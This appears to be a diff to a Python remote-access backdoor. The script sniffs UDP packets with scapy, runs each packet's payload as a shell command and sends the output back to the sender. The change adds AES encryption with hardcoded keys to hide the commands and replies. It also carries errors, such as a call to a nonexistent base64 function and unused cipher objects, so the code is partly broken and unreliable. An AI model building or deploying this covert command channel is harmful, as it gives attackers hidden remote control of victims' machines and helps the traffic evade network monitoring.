@@ -5,6 +5,9 @@ import os
 import argparse
 import platform
 import subprocess
+import time
+import base64
+from Crypto.Cipher import AES
 from ctypes import *
 from scapy.all import *
 
@@ -32,12 +35,31 @@ parser.add_argument('-d'
 #                    , help='Interface to sniff for packets on.')
 args = parser.parse_args()
 sniffFilter = "udp and src port {0} and dst port {1}".format(args.sourcePort, args.destPort)
+encryptionObject = AES.new('This is a key123', AES.MODE_CFB, 'This is an IV456')
+decryptionObject = AES.new('This is a key123', AES.MODE_CFB, 'This is an IV456')
+MASTER_KEY = '12345678901234567890123456789012'
+
+def encrypt(thing):
+  secret = AES.new(MASTER_KEY)
+  tagString = str(thing) + (AES.block_size - len(str(thing)) % AES.block_size) * "\0"
+  cipherText = base64.base64encode(secret.encrypt(tagString))
+  return cipherText
+
+def decrypt(cipher_text):
+    dec_secret = AES.new(MASTER_KEY)
+    raw_decrypted = dec_secret.decrypt(base64.b64decode(cipher_text))
+    clear_val = raw_decrypted.rstrip("\0")
+    return clear_val
 
 def runCommand(packet):
-  print "Running command " + packet.load
-  output = subprocess.check_output(packet.load, shell=True, stderr=subprocess.STDOUT)
-  print output
-  packet = IP(packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=output)
+  encryptedData = packet['Raw'].load
+  decryptionObject = AES.new('This is a key123', AES.MODE_CFB, 'This is an IV456')
+  data = decrypt(encryptedData)
+  print "Running command " + data
+  output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
+  encryptedOutput = encrypt(output)
+  packet = IP(dst=packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=encryptedOutput)
+  time.sleep(0.1)
   send(packet)
 
 # if
